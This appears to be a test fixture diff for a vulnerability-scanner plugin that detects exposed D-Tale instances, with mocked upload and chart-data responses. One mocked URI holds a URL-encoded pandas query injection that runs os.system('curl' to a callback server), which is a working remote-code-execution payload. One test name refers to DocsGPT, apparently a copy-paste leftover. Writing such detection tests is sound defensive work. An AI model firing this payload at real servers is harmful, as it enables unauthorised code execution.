@@ -1,0 +1,89 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "Dtale_ExposedUI"
+}
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/dtale/popup/upload"
+        status: 200
+        body_content: '<link rel="preload" href="/dtale/static/fonts/istok.woff" as="font" type="font/woff" crossorigin>'
+                      "<script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
+      },
+      {
+        uri: "/dtale/upload"
+        status: 200
+        body_content: '{"data_id":"112233","success":true}'
+        condition: {
+          headers: [
+            { name: "Content-Type" value: "multipart/form-data; boundary=-" }
+          ]
+          body_content: '---\nContent-Disposition: form-data; name="data.csv"; filename="data.csv"\nContent-Type: text/csv\n\ntest,data\n\n---\nContent-Disposition: form-data; name="header"\n\ntrue\n---\nContent-Disposition: form-data; name="separatorType"\n\ncomma\n---\nContent-Disposition: form-data; name="separator"\n\n-----\n'
+        }
+      },
+      {
+        uri: "/dtale/chart-data/112233?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20{{ T_CBS_URI }}%20%23%22%22%22%29"
+        status: 200
+        body_content: "\"error\":\""
+      },
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "\"error\":\""
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNoCallback_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/dtale/popup/upload"
+        status: 200
+        body_content: '<link rel="preload" href="/dtale/static/fonts/istok.woff" as="font" type="font/woff" crossorigin>'
+            "<script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotDocsGPT_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
